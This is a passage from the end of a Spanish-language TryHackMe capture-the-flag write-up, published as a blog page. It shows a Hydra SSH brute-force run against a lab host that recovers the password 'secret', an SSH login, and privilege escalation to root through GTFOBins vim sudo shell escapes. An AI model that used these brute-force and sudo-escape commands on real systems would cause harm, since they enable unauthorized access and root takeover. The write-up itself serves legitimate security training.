+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Restorefile <span style="color:#f92672">(</span>you have <span style="color:#ae81ff">10</span> seconds to abort... <span style="color:#f92672">(</span>use option -I to skip waiting<span style="color:#f92672">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">14344399</span> login tries <span style="color:#f92672">(</span>l:1/p:14344399<span style="color:#f92672">)</span>, ~896525 tries per task
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://10.10.60.189:2222/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2222<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.10.60.189   login: mitch   password: secret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Writing restore file because <span style="color:#ae81ff">1</span> final worker threads did not complete <span style="color:#66d9ef">until</span> end.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">1</span> target did not resolve or could not be connected
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">0</span> target did not complete
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2022-10-16 00:03:38
+</span></span></code></pre></div><p>Ya tenemos la contraseña, era muy insegura. Ahora puedo entrar en el equipo por ssh y obtener la primera bandera.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alberto㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Descargas<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh mitch@10.10.60.189 -p <span style="color:#ae81ff">2222</span>
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;[10.10.60.189]:2222 ([10.10.60.189]:2222)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span><span style="color:#f92672">[</span>10.10.60.189<span style="color:#f92672">]</span>:2222<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mitch@10.10.60.189&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 16.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-58-generic i686<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> packages can be updated.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates are security updates.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Mon Aug <span style="color:#ae81ff">19</span> 18:13:41 <span style="color:#ae81ff">2019</span> from 192.168.0.190
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>mitch
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>$ cat us	
+</span></span><span style="display:flex;"><span>cat: us: No such file or directory
+</span></span><span style="display:flex;"><span>$ cat user.txt
+</span></span><span style="display:flex;"><span>G00d j0b, keep up!
+</span></span><span style="display:flex;"><span>$ 
+</span></span></code></pre></div><p>Por último, hay que buscar la manera de escalar privilegios. Una de las formas mas rápidas es buscar algún binario que nos permita usarlo para hacer un bypass a las restricciones de seguridad del sistema. En la página de <strong>gtfobins</strong> busco el binario del vim, que ya lo he usado antes en otras máquinas, y compruebo que esté instalado en el sistema que estoy atacando.</p>
+<p><a href="https://gtfobins.github.io/gtfobins/vim/#sudo">https://gtfobins.github.io/gtfobins/vim/#sudo</a></p>
+<p>Estos son los métodos que hay para vim:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Sudo</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo vim -c <span style="color:#e6db74">&#39;:!/bin/sh&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#This requires that vim is compiled with Python support. Prepend :py3 for Python 3.</span>
+</span></span><span style="display:flex;"><span>sudo vim -c <span style="color:#e6db74">&#39;:py import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-c&#34;, &#34;reset; exec sh&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#This requires that vim is compiled with Lua support.</span>
+</span></span><span style="display:flex;"><span>sudo vim -c <span style="color:#e6db74">&#39;:lua os.execute(&#34;reset; exec sh&#34;)&#39;</span>
+</span></span></code></pre></div><p>Y por suerte, la máquina objetivo lo tiene:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ type vim
+</span></span><span style="display:flex;"><span>vim is a tracked alias <span style="color:#66d9ef">for</span> /usr/bin/vim
+</span></span></code></pre></div><p>Ejecuto el primer método y obtengo acceso al usuario root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$sudo vim -c <span style="color:#e6db74">&#39;:!/bin/sh&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cd root	</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls</span>
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cat root.txt</span>
+</span></span><span style="display:flex;"><span>W3ll d0n3. You made it!
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
+</span></span></code></pre></div><p>Con este último paso hemos completado la sala. Fácil, sencilla y en cómodos pasos.</p>
+<h2 id="-hackea-el-planeta">(◕‿‿◕) ¡Hackea el planeta!</h2>
+</div>
+</article>
+
+    
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/ctf">#CTF</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/easy">#easy</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/hacking">#hacking</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/thm">#THM</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/tryhackme">#tryhackme</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/writeup">#writeup</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+
+<p><small>
+        2022 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
